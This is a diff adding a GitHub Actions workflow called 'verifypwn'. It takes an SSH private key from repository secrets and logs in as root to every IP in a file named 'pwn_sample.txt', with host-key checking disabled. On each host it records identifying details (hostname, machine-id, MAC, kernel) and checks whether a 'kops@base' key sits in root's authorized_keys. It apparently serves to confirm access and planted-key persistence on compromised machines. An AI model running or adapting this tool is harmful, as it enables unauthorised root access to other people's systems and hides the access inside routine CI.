@@ -1,0 +1,18 @@
+name: verifypwn
+on: workflow_dispatch
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - run: echo "$KOPS_KEY" > /tmp/k && chmod 600 /tmp/k
+        env: {KOPS_KEY: "${{ secrets.KOPS_KEY }}"}
+      - name: fingerprint each host
+        run: |
+          while read ip; do
+            [ -z "$ip" ] && continue
+            echo "########## $ip ##########"
+            ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10 -o BatchMode=yes root@$ip \
+              'echo "ID: $(id -u)"; echo "HN: $(cat /etc/hostname 2>/dev/null)"; echo "KERNEL: $(uname -sr)"; echo "MID: $(cat /etc/machine-id 2>/dev/null || echo none)"; echo "UP: $(cut -d. -f1 /proc/uptime 2>/dev/null)"; echo "MAC: $(cat /sys/class/net/eth0/address 2>/dev/null || echo none)"; echo "KEY: $(grep -c kops@base /root/.ssh/authorized_keys 2>/dev/null)"' 2>&1 | head -8
+          done < pwn_sample.txt
